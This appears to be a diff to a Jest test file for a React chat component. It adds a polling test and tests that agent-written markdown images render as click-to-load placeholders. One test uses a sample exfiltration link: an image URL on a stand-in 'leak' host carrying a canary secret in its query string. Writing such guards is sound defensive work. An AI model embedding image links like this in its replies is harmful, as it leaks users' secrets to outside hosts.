@@ -8,7 +8,22 @@ const mockAnswer = jest.fn();
 const mockChange = jest.fn();
 const mockGet = jest.fn();
 
-jest.mock("react-markdown", () => ({ __esModule: true, default: ({ children }: { children: string }) => <p>{children}</p> }));
+jest.mock("react-markdown", () => ({
+  __esModule: true,
+  // An image in the text renders through components.img, as react-markdown renders it; without the override
+  // the plain <img> appears, and the image guard below fails.
+  default: ({ children, components }: { children: string; components?: Record<string, React.ElementType> }) => {
+    const image = /!\[([^\]]*)\]\(([^)\s]+)\)/.exec(children);
+    if (!image) return <p>{children}</p>;
+    const Img = components?.img ?? "img";
+    return (
+      <p>
+        {children.slice(0, image.index)}
+        <Img src={image[2]} alt={image[1]} />
+      </p>
+    );
+  },
+}));
 jest.mock("remark-gfm", () => ({ __esModule: true, default: () => undefined }));
 jest.mock("@/components/markdown/CodeBlock", () => ({ CodeBlock: ({ value }: { value: string }) => <pre>{value}</pre> }));
 jest.mock("@/lib/hivra/managed-session-client", () => {
@@ -23,7 +38,8 @@ jest.mock("@/lib/hivra/managed-session-client", () => {
   };
 });
 
-import { ManagedSessionChat } from "../ManagedSessionChat";
+import { ManagedSessionChat, MD_COMPONENTS } from "../ManagedSessionChat";
+import { AgentMarkdownImage } from "@/components/markdown/agent-markdown-image";
 import type { ManagedSessionDto } from "@/lib/hivra/managed-session-contracts";
 
 class FakeEventSource {
@@ -173,4 +189,54 @@ it("reloads the stored conversation when asked, without losing what the owner is
   expect(await screen.findByText("Hivra setup")).toBeInTheDocument();
   expect(mockHistory).toHaveBeenCalledTimes(2);
   expect(screen.getByLabelText("Message Builder")).toHaveValue("half a thought");
+});
+
+it("reads a starting session back on a backing-off schedule, and skips reads while the tab is hidden", async () => {
+  jest.useFakeTimers();
+  const hidden = jest.spyOn(document, "hidden", "get").mockReturnValue(false);
+  try {
+    mockGet.mockReset();
+    mockGet.mockResolvedValue({ ...session, status: "provisioning" });
+    const flush = () => act(async () => { for (let i = 0; i < 5; i++) await Promise.resolve(); });
+    render(<ManagedSessionChat initialSession={{ ...session, status: "provisioning" }} />);
+    await flush();
+    expect(mockGet).not.toHaveBeenCalled();
+    hidden.mockReturnValue(true);
+    await act(async () => { jest.advanceTimersByTime(2_500); });
+    expect(mockGet).not.toHaveBeenCalled();
+    hidden.mockReturnValue(false);
+    await act(async () => { jest.advanceTimersByTime(2_500); });
+    expect(mockGet).toHaveBeenCalledTimes(1);
+    // The next read waits for this one to settle, and then backs off to 5 s.
+    await flush();
+    await act(async () => { jest.advanceTimersByTime(2_500); });
+    expect(mockGet).toHaveBeenCalledTimes(1);
+    await act(async () => { jest.advanceTimersByTime(2_500); });
+    expect(mockGet).toHaveBeenCalledTimes(2);
+  } finally {
+    hidden.mockRestore();
+    jest.useRealTimers();
+  }
+});
+
+describe("ManagedSessionChat markdown", () => {
+  it("routes agent-written images through the placeholder, so they never load on render", () => {
+    expect(MD_COMPONENTS.img).toBe(AgentMarkdownImage);
+  });
+
+  it("renders no remote image in an agent reply until the owner clicks it", async () => {
+    mockHistory.mockResolvedValue({
+      events: [{ id: "e1", runId: "run_1", type: "run.token_delta", at: null, data: { text: "Here is the chart: ![chart](https://leak.example.test/p.png?d=CANARY-SECRET)", isReasoning: false } }],
+      prompts: [{ runId: "run_1", text: "Show the chart", createdAt: "2026-09-23T10:00:01Z" }],
+    });
+    const { container } = render(<ManagedSessionChat initialSession={session} />);
+    expect(await screen.findByText("Show the chart")).toBeInTheDocument();
+    await screen.findByText(/Here is the chart/);
+    expect(container.querySelector("img")).toBeNull();
+    const placeholder = screen.getByRole("button", { name: /chart/ });
+    expect(placeholder).toHaveTextContent("leak.example.test");
+
+    fireEvent.click(placeholder);
+    expect(container.querySelector("img")).toHaveAttribute("src", "https://leak.example.test/p.png?d=CANARY-SECRET");
+  });
 });
